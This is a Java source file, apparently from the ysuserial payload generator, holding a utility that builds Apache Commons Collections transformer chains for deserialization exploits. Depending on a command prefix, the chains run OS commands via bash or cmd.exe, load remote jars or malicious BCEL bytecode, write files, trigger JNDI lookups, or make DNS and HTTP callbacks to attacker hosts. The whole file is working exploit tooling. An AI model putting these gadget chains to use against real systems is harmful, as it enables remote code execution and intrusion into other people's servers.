package org.su18.ysuserial.payloads.util;

import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import javax.script.ScriptEngineManager;
import java.io.FileOutputStream;
import java.net.URL;
import java.net.URLClassLoader;

import static org.su18.ysuserial.payloads.config.Config.*;
import static org.su18.ysuserial.payloads.handle.GlassHandler.generateClass;
import static org.su18.ysuserial.payloads.util.Gadgets.*;
import static org.su18.ysuserial.payloads.util.Utils.*;

/**
 * TS - Thread Sleep sleep 检查       TS-10
 * RJ - Remote Jar  远程 Jar 包加载   RJ-http://aaa.com/Evil.jar#EvilClass
 * WF - Write File 文件写入          WF-/tmp/1.txt#123
 * PB - ProcessBuilder 命令执行      PB-whoami
 * SE - ScriptEngineManager 解析 JS 执行 Runtime   SE-whoami
 * DL - DNSLOG InetAddress Log     DL-xxx.dnslog.cn
 * HL - HTTPLOG URL 初始化          HL-xxxx.com
 * BC - BCEL ClassLoader 加载恶意类字节码  BC-$$bcel$$xxxx
 * JD - JNDI 查询                   JD-ldap://xxx:1389/xxx
 * <p>
 * 默认 whoami ，Runtime 命令执行
 *
 * @author su18
 */
public class TransformerUtil {

	public static Transformer[] makeTransformer(String command) throws Exception {
		Transformer[] transformers;
		String[]      execArgs = {command};

		if (command.startsWith("TS-")) {
			transformers = new Transformer[]{new ConstantTransformer(Thread.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"currentThread", null}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{Long.parseLong(command.split("[-]")[1] + "000")}),};
		} else if (command.startsWith("RC-")) {
			String[] strings = handlerCommand(command);
			transformers = new Transformer[]{new ConstantTransformer(URLClassLoader.class), new InstantiateTransformer(new Class[]{URL[].class}, new Object[]{new URL[]{new URL(strings[0])}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{strings[1]}), new InstantiateTransformer(null, null)};
		} else if (command.startsWith("WF-")) {
			String[] strings = handlerCommand(command);
			transformers = new Transformer[]{new ConstantTransformer(FileOutputStream.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{strings[0]}}), new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{base64Decode(strings[1]).getBytes()}), new ConstantTransformer(Integer.valueOf(1))};
		} else if (command.startsWith("PB-lin")) {
			transformers = new Transformer[]{new ConstantTransformer(ProcessBuilder.class), new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String[].class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new String[]{"bash", "-c", base64Decode(command.split("[-]")[2])}}}), new InvokerTransformer("start", new Class[]{}, new Object[]{})};
		} else if (command.startsWith("PB-win")) {
			transformers = new Transformer[]{new ConstantTransformer(ProcessBuilder.class), new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String[].class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new String[]{"cmd.exe", "/c", base64Decode(command.split("[-]")[2])}}}), new InvokerTransformer("start", new Class[]{}, new Object[]{})};
		} else if (command.startsWith("SE-")) {
			transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"js"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{"java.lang.Runtime.getRuntime().exec('" + base64Decode(command.split("[-]")[1]) + "');"})};
		} else if (command.startsWith("DL-")) {
			transformers = new Transformer[]{new ConstantTransformer(java.net.InetAddress.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getAllByName", new Class[]{String.class}}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{command.split("[-]")[1]}}), new ConstantTransformer(1)};
		} else if (command.startsWith("HL-")) {
			transformers = new Transformer[]{new ConstantTransformer(java.net.URL.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{command.split("[-]")[1]}}), new InvokerTransformer("getContent", new Class[0], new Object[0]), new ConstantTransformer(1)};
		} else if (command.startsWith("BC-")) {
			command = command.substring(3);
			String bcelBytes;

			// 对 BCEL 也支持 EX 或 LF 扩展功能
			if (command.startsWith("EX-") || command.startsWith("LF-")) {
				CtClass ctClass = generateClass(command);
				bcelBytes = generateBCELFormClassBytes(encapsulationByClassLoaderTemplate(ctClass.toBytecode()).toBytecode());
			} else {
				bcelBytes = command;
			}

			transformers = new Transformer[]{new ConstantTransformer(com.sun.org.apache.bcel.internal.util.ClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelBytes}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
		} else if (command.startsWith("JD-")) {
			transformers = new Transformer[]{new ConstantTransformer(javax.naming.InitialContext.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("lookup", new Class[]{String.class}, new Object[]{command.split("[-]")[1]}), new ConstantTransformer(1)};
		} else if (command.startsWith("EX-") || command.startsWith("LF-")) {
			CtClass ctClass = generateClass(command);

			if (USING_MOZILLA_DEFININGCLASSLOADER) {
				// 使用 DefiningClassLoader 加载，不是所有 JDK 均有 org.mozilla.javascript.DefiningClassLoader
				// 在 NC 中可以使用
				transformers = new Transformer[]{new ConstantTransformer(org.mozilla.javascript.DefiningClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{ctClass.getName(), ctClass.toBytecode()}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
			} else {
				// 使用 ScriptEngineManager JS eval 加载
				transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"JavaScript"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{getJSEngineValue(encapsulationByClassLoaderTemplate(ctClass.toBytecode()).toBytecode())})};
			}
		} else {
			transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, (Object[]) execArgs), new ConstantTransformer(Integer.valueOf(1))};
		}
		return transformers;
	}


}
